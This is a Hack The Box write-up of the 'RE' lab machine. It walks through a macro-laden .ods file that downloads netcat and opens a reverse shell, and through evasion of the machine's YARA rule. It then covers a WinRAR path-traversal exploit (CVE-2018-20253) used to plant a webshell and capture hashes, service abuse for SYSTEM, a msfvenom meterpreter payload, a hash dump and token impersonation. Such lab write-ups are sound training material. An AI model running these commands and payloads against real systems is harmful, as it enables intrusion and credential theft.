---
layout: single
title: RE - Hack The Box
excerpt: "I had fun solving RE but I did it using an unintended path. After getting a shell with a macroed .ods file, I saw that the Winrar version had a CVE which allowed me to drop a webshell in the webserver path and get RCE as `iis apppool\\re`. The user had access to modify the UsoSvc service running with SYSTEM privileges so it was trivial at that point to get a SYSTEM shell. Because the root flag was encrypted for user Coby, I used meterpreter to impersonate his token and read the file."
date: 2020-02-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-re/re_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - yara
  - usosvc
  - unintended
  - libreoffice
  - macros
  - ods
  - CVE-2018-20253
---

![](/assets/images/htb-writeup-re/re_logo.png)

I had fun solving RE but I did it using an unintended path. After getting a shell with a macroed .ods file, I saw that the Winrar version had a CVE which allowed me to drop a webshell in the webserver path and get RCE as `iis apppool\re`. The user had access to modify the UsoSvc service running with SYSTEM privileges so it was trivial at that point to get a SYSTEM shell. Because the root flag was encrypted for user Coby, I used meterpreter to impersonate his token and read the file.

## Summary

- Find the blog site and the hints related to malware and yara rules
- Craft a malicious .ods file with a macro that downloads and executes netcat when the document is opened
- Upload the file through the SMB share and gain a shell as user Luke
- Exploit CVE-2018-20253 to write an aspx webshell into one of the webserver directories
- Get a shell with the aspx as user `iis apppool\re`
- Reconfigure the UsoSvc service to spawn another netcat and get a shell as SYSTEM
- Upload a meterpreter, impersonate user Coby and read the final flag

## Initial recon

### Portscan

```
# nmap -sC -sV -p- 10.10.10.144
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-29 16:06 EST
Nmap scan report for re.htb (10.10.10.144)
Host is up (0.019s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ghidra Dropbox Coming Soon!
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 45s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-01-29T21:09:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.37 seconds
```

### SMB share

I have access to the `malware_dropbox` SMB share with read-only privileges:

```
# smbmap -u invalid -H 10.10.10.144
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.144...
[+] IP: 10.10.10.144:445	Name: re.htb
	Disk                                               	Permissions
	----                                               	-----------
	IPC$                                              	READ ONLY
	malware_dropbox                                   	READ ONLY
```

However the directory is empty:

```
# smbclient -U invalid //10.10.10.144/malware_dropbox
Enter WORKGROUP\invalid's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 22 20:18:47 2019
  ..                                  D        0  Mon Jul 22 20:18:47 2019

		8247551 blocks of size 4096. 4323774 blocks available
```

### Website enumeration: re.htb

The `re.htb` site is incomplete;

![](/assets/images/htb-writeup-re/re.png)

The HTML source contains a hint about a Ghidra project directory structure. The title of the page is `Ghidra Dropbox Coming Soon!` so it's probably some kind of site where we can upload malware to be analyzed.

```
<!--future capability
	<p> To upload Ghidra project:
	<ol>
	  <li> exe should be at project root.Directory stucture should look something like:
	      <code><pre>
|   vulnerserver.gpr
|   vulnserver.exe
\---vulnerserver.rep
    |   project.prp
    |   projectState
    |
    +---idata
    |   |   ~index.bak
    |   |   ~index.dat
    |   |
    |   \---00
    |       |   00000000.prp
    |       |
    |       \---~00000000.db
    |               db.2.gbf
    |               db.3.gbf
    |
    +---user
    |       ~index.dat
    |
    \---versioned
            ~index.bak
            ~index.dat
		  </pre></code>
	  </li>
	  <li>Add entire directory into zip archive.</li>
	  <li> Upload zip here:</li>
    </ol> -->
```

### Website enumeration: 10.10.10.144

![](/assets/images/htb-writeup-re/ip.png)

The IP website redirects to `reblog.htb` so I'll add that domain to my local hostfile.

`<meta http-equiv = "refresh" content = "2; url = http://reblog.htb" />`

### Website enumeration: reblog.htb

After adding `reblog.htb` to my `/etc/hosts`, the redirect works and I can load the blog page.

![](/assets/images/htb-writeup-re/reblog.png)

Based on the HTML source code, I see the blog page is built using Jekyll, a popular static website generator.

```html
<meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Automation and Accounts on Analysis Box | RE Blog</title>
<meta name="generator" content="Jekyll v3.8.5" />
```

The blog contains a bunch of useful info, including some potential hints about what we need to do.

![](/assets/images/htb-writeup-re/blog1.png)

![](/assets/images/htb-writeup-re/blog2.png)

![](/assets/images/htb-writeup-re/blog3.png)

![](/assets/images/htb-writeup-re/blog4.png)

![](/assets/images/htb-writeup-re/blog5.png)

![](/assets/images/htb-writeup-re/blog6.png)

The `.ods` file extension is used by LibreOffice Calc and this seems to be a hint that I need to use this file format for my payload. One blog post says that malware samples dropped on the share will automatically be executed, but as a low privilege user. This is likely the first step to get a foothold on the box. The blog posts link to [0xdf's blog post about Yara rules](https://0xdf.gitlab.io/2019/03/27/analyzing-document-macros-with-yara.html). The example shown on the blog blacklists the following Subs:

- Sub OnLoad
- Sub Exploit

Because I can assign any macro to the Open Document event, I can use `Run_at_open` (or any name for that matter) instead of `OnLoad` for the function name and it won't be caught by the YARA rule.

I created a `sales.ods` file with the following macro using `certutil` to download netcat and execute it.

```vb
Sub Run_at_open
	Shell("certutil.exe -urlcache -split -f 'http://10.10.16.9/nc.exe' C:\Windows\System32\spool\drivers\color\nc.exe")
	Shell("C:\Windows\System32\spool\drivers\color\nc.exe 10.10.16.9 4444 -e cmd.exe")
End Sub
```

The macro needs to be assigned to the `Open Document` Event as follows:

![](/assets/images/htb-writeup-re/macroassign.png)

![](/assets/images/htb-writeup-re/shell.png)

I now have a shell as `Luke` and can read the user flag:

```
C:\Users\luke\Desktop>whoami
whoami
re\luke

C:\Users\luke\Desktop>type user.txt
type user.txt
FE41736...
```

## Privilege escalation to SYSTEM the unintended way

There's two other users: `cam` and `coby`:

```
C:\Users\luke\Desktop>net users

User accounts for \\RE

-------------------------------------------------------------------------------
Administrator            cam                      coby
DefaultAccount           Guest                    luke
WDAGUtilityAccount
The command completed successfully.
```

Cam doesn't have additonal privileges but Coby is a local admin:

```
C:\Users\luke\Desktop>net user cam
[...]
Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.


C:\Users\luke\Desktop>net users coby
[...]

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users
Global Group memberships     *None
The command completed successfully.
```

Luke's document directory contains the script `process_samples.ps1` that automatically processes the malware samples uploaded to the share.

```
 Directory of C:\Users\luke\Documents

06/18/2019  02:05 PM    <DIR>          .
06/18/2019  02:05 PM    <DIR>          ..
07/22/2019  06:31 PM    <DIR>          malware_dropbox
07/22/2019  06:32 PM    <DIR>          malware_process
07/22/2019  06:32 PM    <DIR>          ods
06/18/2019  10:30 PM             1,096 ods.yara
06/18/2019  10:33 PM             1,783 process_samples.ps1
03/13/2019  06:47 PM         1,485,312 yara64.exe
```

As suspected, the `ods.yara` file only contains the examples from the blog post and that's why the `Run_at_open` method worked.

```
[...]
$getos = "select case getGUIType" nocase wide ascii
$getext = "select case GetOS" nocase wide ascii
$func1 = "Sub OnLoad" nocase wide ascii
$func2 = "Sub Exploit" nocase wide ascii
$func3 = "Function GetOS() as string" nocase wide ascii
$func4 = "Function GetExtName() as string" nocase wide ascii
[...]
```

The `process_samples.ps1` script that processes malware samples is shown below:

```powershell
$process_dir = "C:\Users\luke\Documents\malware_process"
$files_to_analyze = "C:\Users\luke\Documents\ods"
$yara = "C:\Users\luke\Documents\yara64.exe"
$rule = "C:\Users\luke\Documents\ods.yara"

while($true) {
	# Get new samples
	move C:\Users\luke\Documents\malware_dropbox\* $process_dir

	# copy each ods to zip file
	Get-ChildItem $process_dir -Filter *.ods |
	Copy-Item -Destination {$_.fullname -replace ".ods", ".zip"}

	Get-ChildItem $process_dir -Filter *.zip | ForEach-Object {

		# unzip archive to get access to content
		$unzipdir = Join-Path $_.directory $_.Basename
		New-Item -Force -ItemType directory -Path $unzipdir | Out-Null
		Expand-Archive $_.fullname -Force -ErrorAction SilentlyContinue -DestinationPath $unzipdir

		# yara to look for known malware
		$yara_out = & $yara -r $rule $unzipdir
		$ods_name = $_.fullname -replace ".zip", ".ods"
		if ($yara_out.length -gt 0) {
			Remove-Item $ods_name
		}
	}


	# if any ods files left, make sure they launch, and then archive:
	$files = ls $process_dir\*.ods
	if ( $files.length -gt 0) {
		# launch ods files
		Invoke-Item "C:\Users\luke\Documents\malware_process\*.ods"
		Start-Sleep -s 5

		# kill open office, sleep
		Stop-Process -Name soffice*
		Start-Sleep -s 5

		#& 'C:\Program Files (x86)\WinRAR\Rar.exe' a -ep $process_dir\temp.rar $process_dir\*.ods 2>&1 | Out-Null
		Compress-Archive -Path "$process_dir\*.ods" -DestinationPath "$process_dir\temp.zip"
		$hash = (Get-FileHash -Algorithm MD5 $process_dir\temp.zip).hash
		# Upstream processing may expect rars. Rename to .rar
		Move-Item -Force -Path $process_dir\temp.zip -Destination $files_to_analyze\$hash.rar
	}

	Remove-Item -Recurse -force -Path $process_dir\*
	Start-Sleep -s 5
}
```

If I understand this correctly:

- The contents of the `malware_dropbox` share are moved to `C:\Users\luke\Documents\malware_process`
- The .ods files are renamed to .zip
- The .zip file is extracted and the contents processes by the Yara rules with `yara64.exe`
- If the file matches a Yara rule, it gets deleted
- Anything left gets executed with LibreOffice
- The files are repackaged in a .rar file and moved to `C:\Users\luke\Documents\ods` for further processing

The .rar reference is a subtle hint. When I look at the Downloads directory I see that an old WinRAR version was downloaded:

```
03/13/2019  06:45 PM       298,860,544 LibreOffice_6.2.1_Win_x64.msi
03/14/2019  05:13 AM         3,809,704 npp.7.6.4.Installer.x64.exe
03/15/2019  10:22 AM         1,987,544 winrar-5-50-beta-1-x86.exe
```

There's a `CVE-2018-20253` that impacts all versions prior to and including 5.60. When the filename field is manipulated with specific patterns, the destination folder is ignored and the filename is treated as an absolute path. So basically an attacker can write anywhere on the target host when the file is unpacked, not just the directory where's it's extracted. This vulnerability is similar to the zipslip vulnerability.


The first thing I'll try it to get the hash of the user extracting the .rar files:

```
# python3 /opt/Evil-WinRAR-Gen/evilWinRAR.py -e evil.txt -g good.txt -p '\\10.10.16.9\snowscan\gimmehashes'

          _ _  __      ___      ___    _   ___
  _____ _(_) | \ \    / (_)_ _ | _ \  /_\ | _ \
 / -_) V / | |  \ \/\/ /| | ' \|   / / _ \|   /
 \___|\_/|_|_|   \_/\_/ |_|_||_|_|_\/_/ \_\_|_\

                                        by @manulqwerty

----------------------------------------------------------------------

[+] Evil archive generated successfully: evil.rar
[+] Evil path: \\10.10.16.9\snowscan\gimmehashes
```

The .rar file will try to extract to an SMB on my system and I'll use responder to get the NetNTLMv2 hash of the user.

![](/assets/images/htb-writeup-re/responder.png)

I tried cracking Cam's NTLMv2 hash but I wasn't able to crack it with rockyou.txt.

When I check the web directory, I see that Cam has write access:

```
C:\inetpub>icacls wwwroot
wwwroot RE\coby:(OI)(CI)(RX,W)
        RE\cam:(OI)(CI)(RX,W)
        BUILTIN\IIS_IUSRS:(OI)(CI)(RX)
        NT SERVICE\TrustedInstaller:(I)(F)
        NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
        BUILTIN\Users:(I)(RX)
        BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
        CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

I can place a webshell in the directory using the same Winrar exploit:

![](/assets/images/htb-writeup-re/aspx1.png)

And now I have RCE as `iis apppool\re`

![](/assets/images/htb-writeup-re/aspx2.png)

I'll pop another shell with netcat:

```
# nc -lvnp 5555
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.10.144.
Ncat: Connection from 10.10.10.144:60328.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
iis apppool\re

c:\windows\system32\inetsrv>
```

Then use PowerUp from Powersploit to look for privesc vectors:

```
c:\ProgramData>certutil -urlcache -f http://10.10.16.9/PowerUp.ps1 powerup.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\ProgramData>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\ProgramData> import-module .\powerup.ps1
PS C:\ProgramData> invoke-allchecks

[...]

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
```

I have write access to the `UsoSvc` service so I can change the BinPath and execute anything I want as SYSTEM. The default `Invoke-ServiceAbuse` parameters will simply add a new user with local admin rights.

```
PS C:\ProgramData> Invoke-ServiceAbuse -Name 'UsoSvc'

ServiceAbused Command
------------- -------
UsoSvc        net user john Password123! /add && net localgroup Administrators john /add
```

Instead I can pop a reverse shell using netcat I uploaded earlier.

```
PS C:\ProgramData> Invoke-ServiceAbuse -Name 'UsoSvc' -command 'C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.16.9 8888'
```

![](/assets/images/htb-writeup-re/system.png)

I have SYSTEM but I can't read the flag:

```
C:\Users\Administrator\Desktop>icacls root.txt
root.txt NT AUTHORITY\SYSTEM:(I)(F)
         BUILTIN\Administrators:(I)(F)
         RE\Administrator:(I)(F)
         RE\coby:(I)(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator\Desktop>type root.txt
type root.txt
Access is denied.
```

I also lose my shell after a few seconds because the process doesn't respond to the service manager so it gets terminated.

I'm going to drop a Meterpreter payload on the box, run it as SYSTEM and quickly migrate to a new process so I don't lose the shell:

```
# msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o met.exe LHOST=10.10.16.9 LPORT=4444

C:\Windows\System32\spool\drivers\color>certutil -urlcache -f http://10.10.16.9/met.exe met.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

![](/assets/images/htb-writeup-re/msf.png)


Got a stable shell now, let's dump the hashes first:

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:caf97bbc4c410103485a3cf950496493:::
cam:1002:aad3b435b51404eeaad3b435b51404ee:1916525df2db99ef56a75152807da93d:::
coby:1000:aad3b435b51404eeaad3b435b51404ee:fa88e03e41fdf7b707979c50d57c06cf:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
john:1003:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
luke:1001:aad3b435b51404eeaad3b435b51404ee:3670611a3c1a68757854520547ab5f24:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:275fb2a3ea8b2433976482b69b94497b:::
```

I can't read `root.txt` because it's encrypted for Coby:

```
C:\Users\Administrator\Desktop>cipher /c root.txt

 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    RE\Administrator [Administrator(Administrator@RE)]
    Certificate thumbprint: E088 5900 BE20 19BE 6224 E5DE 3D97 E3B4 FD91 C95D

    coby(coby@RE)
    Certificate thumbprint: 415E E454 C45D 576D 59C9 A0C3 9F87 C010 5A82 87E0

  No recovery certificate found.

  Key Information:
    Algorithm: AES
    Key Length: 256
    Key Entropy: 256
```

I'll do it the easy and just impersonate Coby since I have SYSTEM access.

```
meterpreter > load incognito
[-] The 'incognito' extension has already been loaded.
meterpreter > list_tokens -u coby

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
IIS APPPOOL\re
IIS APPPOOL\REblog
NT AUTHORITY\IUSR
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
RE\cam
RE\coby
RE\luke
Window Manager\DWM-1

Impersonation Tokens Available
========================================
IIS APPPOOL\ip

meterpreter > impersonate_token RE\\coby
[+] Delegation token available
[+] Successfully impersonated user RE\coby
```

And I can now read the flag:

```
meterpreter > shell
Process 3760 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
1B4FB90...
```